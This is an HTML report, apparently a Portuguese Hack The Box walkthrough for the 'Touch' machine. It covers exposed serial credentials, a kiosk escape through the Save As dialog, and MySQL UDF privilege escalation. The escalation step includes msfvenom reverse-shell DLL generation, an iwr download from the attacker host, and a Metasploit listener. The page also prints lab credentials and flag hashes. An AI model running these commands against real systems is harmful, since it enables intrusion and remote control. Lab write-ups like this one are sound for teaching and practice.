@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Touch — Hack The Box Walkthrough & Report</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+  :root {
+    --primary: #0284c7;
+    --primary-dark: #0369a1;
+    --accent: #059669;
+    --danger: #dc2626;
+    --warning: #d97706;
+    --bg: #ffffff;
+    --border: #cbd5e1;
+    --border-light: #e2e8f0;
+    --text: #0f172a;
+    --text-muted: #475569;
+    --code-bg: #f8fafc;
+    --code-text: #0f172a;
+  }
+
+  @page {
+    size: A4;
+    margin: 14mm 14mm 14mm 14mm;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    color: var(--text);
+    background: #ffffff;
+    line-height: 1.5;
+    font-size: 12.5px;
+    -webkit-print-color-adjust: exact;
+    print-color-adjust: exact;
+  }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0;
+  }
+
+  /* Header */
+  .report-header {
+    border-bottom: 2px solid #0f172a;
+    padding-bottom: 12px;
+    margin-bottom: 16px;
+  }
+
+  .report-title {
+    font-size: 24px;
+    font-weight: 800;
+    color: #0f172a;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+
+  .badge-grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-top: 6px;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-size: 11.5px;
+    font-weight: 600;
+    border: 1px solid #cbd5e1;
+    background: #f1f5f9;
+    color: #1e293b;
+  }
+
+  .badge-htb { background: #0f172a; color: #ffffff; border-color: #0f172a; }
+  .badge-diff { background: #dcfce7; color: #166534; border-color: #bbf7d0; }
+  .badge-os { background: #e0f2fe; color: #075985; border-color: #bae6fd; }
+
+  /* Headings */
+  h2 {
+    font-size: 15.5px;
+    font-weight: 700;
+    color: #0f172a;
+    margin: 18px 0 8px 0;
+    padding-bottom: 4px;
+    border-bottom: 1.5px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    page-break-after: avoid;
+    break-after: avoid;
+  }
+
+  h3 {
+    font-size: 13px;
+    font-weight: 600;
+    color: #1e293b;
+    margin: 12px 0 5px 0;
+    page-break-after: avoid;
+    break-after: avoid;
+  }
+
+  p {
+    margin-bottom: 8px;
+    color: #334155;
+  }
+
+  /* Tables */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 8px 0 12px 0;
+    font-size: 11.5px;
+    background: #ffffff;
+    border: 1px solid var(--border);
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  th {
+    background: #f1f5f9;
+    color: #0f172a;
+    font-weight: 700;
+    text-align: left;
+    padding: 6px 10px;
+    border: 1px solid var(--border);
+  }
+
+  td {
+    padding: 6px 10px;
+    border: 1px solid var(--border);
+    color: #1e293b;
+  }
+
+  tr:nth-child(even) {
+    background: #f8fafc;
+  }
+
+  .sev-crit {
+    color: #991b1b;
+    font-weight: 700;
+    background: #fee2e2;
+    padding: 2px 6px;
+    border-radius: 4px;
+    border: 1px solid #fca5a5;
+    display: inline-block;
+  }
+
+  .sev-high {
+    color: #9a3412;
+    font-weight: 700;
+    background: #ffedd5;
+    padding: 2px 6px;
+    border-radius: 4px;
+    border: 1px solid #fdba74;
+    display: inline-block;
+  }
+
+  /* Code Blocks */
+  pre {
+    background: #f8fafc;
+    color: #0f172a;
+    font-family: 'JetBrains Mono', Consolas, Monaco, monospace;
+    font-size: 10.5px;
+    padding: 8px 10px;
+    border-radius: 5px;
+    margin: 6px 0 10px 0;
+    line-height: 1.45;
+    border: 1px solid #cbd5e1;
+    border-left: 3.5px solid #0284c7;
+    white-space: pre-wrap;
+    word-break: break-all;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  code {
+    font-family: 'JetBrains Mono', Consolas, Monaco, monospace;
+    font-size: 11px;
+    background: #f1f5f9;
+    color: #0f172a;
+    padding: 1px 4px;
+    border-radius: 3px;
+    border: 1px solid #cbd5e1;
+  }
+
+  pre code {
+    background: transparent;
+    color: #0f172a;
+    padding: 0;
+    border: none;
+    font-size: inherit;
+  }
+
+  /* Callouts & Blockquotes */
+  blockquote {
+    border-left: 3.5px solid #0284c7;
+    background: #f0f9ff;
+    padding: 8px 12px;
+    border-radius: 0 4px 4px 0;
+    margin: 8px 0;
+    font-size: 12px;
+    color: #0369a1;
+    border-top: 1px solid #e0f2fe;
+    border-right: 1px solid #e0f2fe;
+    border-bottom: 1px solid #e0f2fe;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  .highlight-card {
+    background: #f8fafc;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  /* Images */
+  .img-container {
+    margin: 10px 0 14px 0;
+    text-align: center;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  .img-container img {
+    max-width: 100%;
+    max-height: 380px;
+    height: auto;
+    border-radius: 6px;
+    border: 1px solid var(--border);
+    box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+  }
+
+  .img-caption {
+    font-size: 11px;
+    color: var(--text-muted);
+    margin-top: 4px;
+    font-style: italic;
+  }
+
+  /* Flags Cards */
+  .flag-box {
+    display: flex;
+    gap: 12px;
+    margin: 8px 0 12px 0;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  .flag-card {
+    flex: 1;
+    background: #f8fafc;
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 10px 12px;
+    text-align: left;
+  }
+
+  .flag-card.user { border-left: 4px solid #0284c7; }
+  .flag-card.root { border-left: 4px solid #dc2626; }
+
+  .flag-title {
+    font-weight: 700;
+    font-size: 11px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 2px;
+  }
+
+  .flag-hash {
+    font-family: 'JetBrains Mono', Consolas, monospace;
+    font-size: 12px;
+    font-weight: 700;
+    color: #0f172a;
+  }
+
+  /* Diagram */
+  .diagram-box {
+    background: #f8fafc;
+    color: #0f172a;
+    font-family: 'JetBrains Mono', Consolas, monospace;
+    font-size: 9.5px;
+    padding: 10px 12px;
+    border-radius: 5px;
+    line-height: 1.25;
+    margin: 8px 0;
+    border: 1px solid var(--border);
+    border-left: 3.5px solid #0f172a;
+    white-space: pre;
+    overflow-x: hidden;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  .page-break {
+    page-break-before: always;
+    break-before: always;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- Header -->
+  <div class="report-header">
+    <div class="report-title">
+      🖥️ Touch — Hack The Box Walkthrough
+    </div>
+    <div class="badge-grid">
+      <span class="badge badge-htb">Hack The Box</span>
+      <span class="badge badge-diff">Dificuldade: Easy</span>
+      <span class="badge badge-os">OS: Windows</span>
+      <span class="badge">Host IP: 10.129.74.113</span>
+      <span class="badge" style="background: #dcfce7; color: #15803d; border-color: #86efac;">Status: Solved ✅</span>
+    </div>
+    <div style="margin-top: 8px; font-size: 11.5px; color: var(--text-muted);">
+      <strong>Técnicas:</strong> Web Information Disclosure, Default Serial Password, RDP Kiosk Breakout (Save Dialog Bypass), MySQL UDF (User Defined Functions) Code Execution, Windows Privilege Escalation.
+    </div>
+  </div>
+
+  <!-- Sumário Executivo -->
+  <h2>📋 Sumário Executivo</h2>
+  <table>
+    <thead>
+      <tr>
+        <th style="width: 25%;">Fase</th>
+        <th style="width: 45%;">Vetor de Ataque</th>
+        <th style="width: 30%;">Resultado</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Reconhecimento</strong></td>
+        <td>Varredura Nmap + Enumeração Web (porta 8443)</td>
+        <td>Descoberta de <code>touch.htb:8443</code> e serial <code>NX-DH-2024-B7042</code></td>
+      </tr>
+      <tr>
+        <td><strong>2. Foothold / User</strong></td>
+        <td>Login no portal &rarr; Credenciais RDP &rarr; Kiosk Breakout (Edge Save Dialog)</td>
+        <td>Shell como <code>KioskUser</code> & Flag de Usuário</td>
+      </tr>
+      <tr>
+        <td><strong>3. Escalação para Root/Admin</strong></td>
+        <td>MySQL local com root exposto &rarr; Injeção de DLL UDF (<code>evil.dll</code> via <code>sys_exec</code>)</td>
+        <td>Shell SYSTEM / Administrator & Flag Root</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- Fase 1 -->
+  <h2>🔍 Fase 1 — Reconhecimento e Enumeração</h2>
+  
+  <h3>1.1 Varredura de Portas (Nmap)</h3>
+  <pre><code>nmap -Pn -n -sV --top-ports 1000 --open --reason -T4 --max-retries 2 10.129.74.113</code></pre>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Porta</th>
+        <th>Estado</th>
+        <th>Serviço</th>
+        <th>Versão / Detalhes</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>135/tcp</strong></td>
+        <td>open</td>
+        <td>msrpc</td>
+        <td>Microsoft Windows RPC</td>
+      </tr>
+      <tr>
+        <td><strong>3389/tcp</strong></td>
+        <td>open</td>
+        <td>ms-wbt-server</td>
+        <td>Microsoft Terminal Service (RDP)</td>
+      </tr>
+      <tr>
+        <td><strong>5985/tcp</strong></td>
+        <td>open</td>
+        <td>http</td>
+        <td>Microsoft HTTPAPI httpd 2.0 (WinRM)</td>
+      </tr>
+      <tr>
+        <td><strong>8443/tcp</strong></td>
+        <td>open</td>
+        <td>http</td>
+        <td>Microsoft HTTPAPI httpd 2.0 (Nexion DeviceHub)</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>1.2 Enumeração Web (Porta 8443)</h3>
+  <p>Acessando a API de status desautenticada em <code>http://touch.htb:8443/api/status</code>:</p>
+  <pre><code>curl -i http://10.129.74.113:8443/api/status</code></pre>
+
+  <div class="img-container">
+    <img src="image.png" alt="API Status Response">
+    <div class="img-caption">Resposta JSON da rota /api/status expondo o serial do dispositivo</div>
+  </div>
+
+  <p><strong>Dados expostos pelo endpoint:</strong></p>
+  <pre><code>{
+  "device": "Nexion DeviceHub DH-100",
+  "serial": "NX-DH-2024-B7042",
+  "firmware": "1.4.2",
+  "status": "online",
+  "uptime": 20761
+}</code></pre>
+
+  <!-- Fase 2 -->
+  <div class="page-break"></div>
+  <h2>🔑 Fase 2 — Foothold & Kiosk Breakout (User)</h2>
+
+  <h3>2.1 Autenticação no Painel Web</h3>
+  <p>O portal web informa que a senha padrão do dispositivo corresponde ao seu número de série (<code>NX-DH-2024-B7042</code>):</p>
+  
+  <div class="img-container">
+    <img src="image 1.png" alt="Login Page">
+    <div class="img-caption">Tela de Login do Nexion DocReader</div>
+  </div>
+
+  <p>Ao realizar o login com o serial, o painel administrativo revela as credenciais do quiosque:</p>
+
+  <div class="img-container">
+    <img src="image 2.png" alt="Dashboard com Credenciais">
+    <div class="img-caption">Dashboard expondo usuário KioskUser e senha</div>
+  </div>
+
+  <blockquote>
+    <strong>Credenciais Descobertas:</strong><br>
+    • <strong>Usuário:</strong> <code>KioskUser</code><br>
+    • <strong>Senha:</strong> <code>K!0sk2026#</code>
+  </blockquote>
+
+  <h3>2.2 Acesso RDP (Quiosque Windows)</h3>
+  <p>Conexão ao quiosque via cliente RDP:</p>
+  <pre><code>xfreerdp3 /u:KioskUser /p:'K!0sk2026#' /v:10.129.74.113</code></pre>
+
+  <div class="img-container">
+    <img src="touc1.png" alt="Login RDP">
+    <div class="img-caption">Autenticação na sessão RDP do Windows</div>
+  </div>
+
+  <div class="img-container">
+    <img src="image 4.png" alt="Aplicação Self Check-in Kiosk">
+    <div class="img-caption">Aplicação HTB Airways Self Check-in em modo quiosque restrito</div>
+  </div>
+
+  <h3>2.3 Escape do Modo Quiosque (Kiosk Breakout)</h3>
+  <p>Ao manipular e desativar os periféricos (scanner/impressora) no painel web e solicitar um escaneamento no quiosque, a aplicação dispara uma janela de erro com um link de suporte clicável:</p>
+
+  <div class="img-container">
+    <img src="image 5.png" alt="Disparo de Erro no Scanner">
+    <div class="img-caption">Erro acionado no quiosque com link para documentação de suporte</div>
+  </div>
+
+  <p>O link abre o navegador Microsoft Edge. Utilizando o atalho padrão de salvamento (<code>Ctrl + S</code>), a caixa de diálogo do Windows Explorer é exibida:</p>
+
+  <div class="img-container">
+    <img src="image 6.png" alt="Navegador aberto pelo erro">
+    <div class="img-caption">Janela do Edge aberta fora do modo quiosque</div>
+  </div>
+
+  <div class="img-container">
+    <img src="image 7.png" alt="Save As Dialog Bypass">
+    <div class="img-caption">Bypass via diálogo Save As (Ctrl+S) digitando cmd.exe na barra de navegação</div>
+  </div>
+
+  <p>Ao digitar <code>cmd.exe</code> ou <code>explorer.exe</code> na barra de caminho do diálogo, um terminal de comando com privilégios de <code>KioskUser</code> é iniciado, permitindo acessar o Desktop e ler a flag de usuário:</p>
+
+  <div class="img-container">
+    <img src="image 8.png" alt="User Flag capturada">
+    <div class="img-caption">Captura da flag de usuário no Desktop</div>
+  </div>
+
+  <blockquote>
+    🔵 <strong>User Flag:</strong> <code>49884f45dfae2715c1c8eb165303197b</code>
+  </blockquote>
+
+  <!-- Fase 3 -->
+  <div class="page-break"></div>
+  <h2>👑 Fase 3 — Escalação de Privilégios (Admin / Root)</h2>
+
+  <h3>3.1 Enumeração de Privilégios e Usuários</h3>
+  <pre><code>whoami /all
+net user KioskUser</code></pre>
+
+  <div class="img-container">
+    <img src="image 9.png" alt="whoami /all">
+    <div class="img-caption">Privilégios do usuário KioskUser</div>
+  </div>
+
+  <div class="img-container">
+    <img src="image 10.png" alt="net user KioskUser">
+    <div class="img-caption">Usuário pertencente ao grupo Printer Administrator</div>
+  </div>
+
+  <h3>3.2 Exploração de UDF no MySQL Local</h3>
+  <p>Identificou-se uma instância local do <strong>MySQL</strong> em execução como serviço de alto privilégio. A senha de root do banco foi obtida nas configurações locais:</p>
+  <blockquote>
+    <strong>Credenciais MySQL:</strong> <code>root</code> / <code>HTB@irw4ys_DB!2026</code>
+  </blockquote>
+
+  <p>Gerando uma DLL maliciosa com carga reversa para Windows x64:</p>
+  <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.140 LPORT=4444 -f dll -o evil.dll</code></pre>
+
+  <p>Transferindo a DLL para o diretório de plugins do MySQL no alvo (<code>C:\MySQL\lib\plugin\evil.dll</code>):</p>
+  <pre><code># Servidor HTTP no Kali:
+python3 -m http.server 8005
+
+# Download no PowerShell do Windows:
+iwr -Uri "http://10.10.15.140:8005/evil.dll" -OutFile "C:\MySQL\lib\plugin\evil.dll"</code></pre>
+
+  <p>Criando a função UDF customizada (<code>sys_exec</code>) no MySQL para carregar a DLL:</p>
+  <pre><code>.\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_exec RETURNS INT SONAME 'evil.dll';"</code></pre>
+
+  <div class="img-container">
+    <img src="image 12.png" alt="Execução do comando MySQL UDF">
+    <div class="img-caption">Criação da função UDF carregando a DLL maliciosa</div>
+  </div>
+
+  <h3>3.3 Reverse Shell e Captura da Flag Root</h3>
+  <p>Configurando o listener no Metasploit / Netcat:</p>
+  <pre><code>msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/shell_reverse_tcp
+set LHOST 10.10.15.140
+set LPORT 4444
+exploit</code></pre>
+
+  <div class="img-container">
+    <img src="image 13.png" alt="Conexão Reversa Obtida no Metasploit">
+    <div class="img-caption">Shell administrativa obtida via MySQL UDF</div>
+  </div>
+
+  <p>Leitura da flag no diretório do Administrador (<code>C:\Users\Administrator\Desktop\root.txt</code>):</p>
+  <pre><code>type C:\Users\Administrator\Desktop\root.txt
+d7809689c5e3c3861887cc518b169258</code></pre>
+
+  <!-- Flags -->
+  <h2>🏁 Flags Obtidas</h2>
+  <div class="flag-box">
+    <div class="flag-card user">
+      <div class="flag-title">🔵 User Flag</div>
+      <div class="flag-hash">49884f45dfae2715c1c8eb165303197b</div>
+    </div>
+    <div class="flag-card root">
+      <div class="flag-title">🔴 Root Flag</div>
+      <div class="flag-hash">d7809689c5e3c3861887cc518b169258</div>
+    </div>
+  </div>
+
+  <!-- Attack Chain -->
+  <h2>🗺️ Attack Chain — Visão Geral</h2>
+  <div class="diagram-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                        ATTACK CHAIN — TOUCH                         │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  1. RECON                                                           │
+│     ├─ Nmap → portas 135, 3389 (RDP), 5985, 8443 (HTTP)            │
+│     └─ GET /api/status → Exposição do serial NX-DH-2024-B7042       │
+│                        │                                            │
+│                        ▼                                            │
+│  2. FOOTHOLD & KIOSK BREAKOUT                                       │
+│     ├─ Login web com serial → Credenciais KioskUser / K!0sk2026#    │
+│     ├─ Conexão RDP (3389) → Interface Kiosk (HTB Airways)           │
+│     ├─ Disparo de erro no scanner → Link de suporte no Edge         │
+│     ├─ Diálogo Save As (Ctrl+S) → Execução de cmd.exe               │
+│     └─ User Flag capturada: 49884f45dfae2715c1c8eb165303197b        │
+│                        │                                            │
+│                        ▼                                            │
+│  3. PRIVILEGE ESCALATION (ROOT / SYSTEM)                            │
+│     ├─ Descoberta de MySQL com senha root: HTB@irw4ys_DB!2026       │
+│     ├─ Upload de DLL maliciosa para C:\MySQL\lib\plugin\evil.dll    │
+│     ├─ CREATE FUNCTION sys_exec RETURNS INT SONAME 'evil.dll'       │
+│     ├─ Execução de código com privilégios do serviço MySQL          │
+│     └─ Root Flag: d7809689c5e3c3861887cc518b169258 (Pwned! ✅)      │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘</div>
+
+  <!-- Vulnerabilidades -->
+  <h2>🛡️ Vulnerabilidades Identificadas & Mitigações</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Vulnerabilidade</th>
+        <th>Localização</th>
+        <th>Impacto</th>
+        <th>Severidade</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>Information Disclosure & Default Credential</td>
+        <td><code>/api/status</code> e <code>/login</code></td>
+        <td>Acesso administrativo inicial via número de série padrão</td>
+        <td><span class="sev-high">Alta</span></td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Kiosk Escape via Diálogos de Sistema</td>
+        <td>Aplicação Kiosk / Microsoft Edge</td>
+        <td>Execução de código arbitrário e quebra de sandbox de quiosque</td>
+        <td><span class="sev-high">Alta</span></td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>MySQL UDF Arbitrary DLL Execution</td>
+        <td>Instância local do MySQL (serviço elevado)</td>
+        <td>Escalação total de privilégios para SYSTEM / Administrator</td>
+        <td><span class="sev-crit">Crítica</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- Lições Aprendidas -->
+  <h2>📝 Lições Aprendidas & Medidas Corretivas</h2>
+  <div class="highlight-card">
+    <ul>
+      <li><strong>Proteção de APIs de Status e Diagnóstico:</strong> Endpoints como <code>/api/status</code> não devem expor números de série, identificadores de hardware ou detalhes de versão publicamente sem autenticação.</li>
+      <li><strong>Substituição Obrigatória de Senhas Padrão:</strong> Equipamentos e quiosques devem forçar a alteração de senhas no primeiro boot, impedindo o uso de números de série como credenciais.</li>
+      <li><strong>Endurecimento de Ambientes Kiosk (Assigned Access):</strong> Utilizar o recurso nativo do Windows <em>Assigned Access</em> (Modo Quiosque de aplicativo único), desabilitando atalhos de teclado (Ctrl+S, Win+R, Ctrl+Shift+Esc) e impedindo o acesso ao sistema de arquivos via diálogos <em>Save As</em>.</li>
+      <li><strong>Proteção de Instâncias MySQL / UDF:</strong> Configurar a variável <code>secure_file_priv</code> para um diretório restrito ou desabilitar o carregamento de plugins/UDFs externos não autorizados, além de executar o serviço MySQL sob conta de serviço com privilégios mínimos (Managed Service Account).</li>
+    </ul>
+  </div>
+
+</div>
+</body>
+</html>
